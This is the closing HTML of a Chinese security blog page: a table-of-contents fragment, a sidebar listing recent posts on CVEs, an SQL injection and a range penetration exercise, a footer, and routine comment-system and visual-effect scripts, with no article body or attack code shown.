class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">开始渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">外网打点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/04/06/%E6%9A%97%E6%9C%88atk123%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" title="暗月atk123靶场渗透"><img src="https://s2.loli.net/2022/04/05/cHoiWpBKzhurAtw.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="暗月atk123靶场渗透"/></a><div class="content"><a class="title" href="/2022/04/06/%E6%9A%97%E6%9C%88atk123%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" title="暗月atk123靶场渗透">暗月atk123靶场渗透</a><time datetime="2022-04-06T10:47:12.000Z" title="发表于 2022-04-06 18:47:12">2022-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/30/%E3%80%90CVE-2022-26271%E3%80%9174cmsSEv3-4-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" title="【CVE-2022-26271】74cmsSEv3.4.1 任意文件读取漏洞"><img src="https://s2.loli.net/2022/03/30/GRSgAxHcqhEbayM.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CVE-2022-26271】74cmsSEv3.4.1 任意文件读取漏洞"/></a><div class="content"><a class="title" href="/2022/03/30/%E3%80%90CVE-2022-26271%E3%80%9174cmsSEv3-4-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" title="【CVE-2022-26271】74cmsSEv3.4.1 任意文件读取漏洞">【CVE-2022-26271】74cmsSEv3.4.1 任意文件读取漏洞</a><time datetime="2022-03-30T07:13:17.000Z" title="发表于 2022-03-30 15:13:17">2022-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/30/%E3%80%90cve-2022-22947%E3%80%91Spring-Cloud-Gateway-rce/" title="【CVE-2022-22947】Spring Cloud Gateway rce"><img src="https://s2.loli.net/2022/03/30/gp9XMa1bIePCE6S.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CVE-2022-22947】Spring Cloud Gateway rce"/></a><div class="content"><a class="title" href="/2022/03/30/%E3%80%90cve-2022-22947%E3%80%91Spring-Cloud-Gateway-rce/" title="【CVE-2022-22947】Spring Cloud Gateway rce">【CVE-2022-22947】Spring Cloud Gateway rce</a><time datetime="2022-03-30T07:12:56.000Z" title="发表于 2022-03-30 15:12:56">2022-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/29/Jfinal-cms-sql-%E6%B3%A8%E5%85%A5/" title="Jfinal_cms sql 注入"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Jfinal_cms sql 注入"/></a><div class="content"><a class="title" href="/2022/03/29/Jfinal-cms-sql-%E6%B3%A8%E5%85%A5/" title="Jfinal_cms sql 注入">Jfinal_cms sql 注入</a><time datetime="2022-03-29T09:17:24.000Z" title="发表于 2022-03-29 17:17:24">2022-03-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/29/Spring-Cloud-Function-SPEL-RCE/" title="Spring-Cloud-Function-SPEL-RCE"><img src="https://s2.loli.net/2022/03/29/jRfHqVMmJh65eUd.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring-Cloud-Function-SPEL-RCE"/></a><div class="content"><a class="title" href="/2022/03/29/Spring-Cloud-Function-SPEL-RCE/" title="Spring-Cloud-Function-SPEL-RCE">Spring-Cloud-Function-SPEL-RCE</a><time datetime="2022-03-29T09:17:01.000Z" title="发表于 2022-03-29 17:17:01">2022-03-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Nice</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎来到我的博客</div><img src="/images/beian.png" style="vertical-align: text-bottom;">
+<a href="http://beian.miit.gov.cn/" style="text-align:center;color:#f8f8ff" target="_blank" rel="nofollow">蜀ICP备2021007655号-1</a></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>(()=>{
+  const $countDom = document.getElementById('twikoo-count')
+  const init = () => {
+    let initData = {
+      el: '#twikoo-wrap',
+      envId: 'niceblog-8g99u80g7cfc5755',
+      region: 'ap-shanghai'
+    }
+
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    twikoo.init(initData)
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: 'niceblog-8g99u80g7cfc5755',
+      region: 'ap-shanghai',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      $countDom.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const loadTwikoo = (bool = false) => {
+    if (typeof twikoo === 'object') {
+      init()
+      bool && $countDom && setTimeout(getCount,0)
+    } else {
+      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
+        init()
+        bool && $countDom && setTimeout(getCount,0)
+      })
+    }
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo(true)
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="190,190,190" opacity="0.5" zIndex="-1" count="222" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
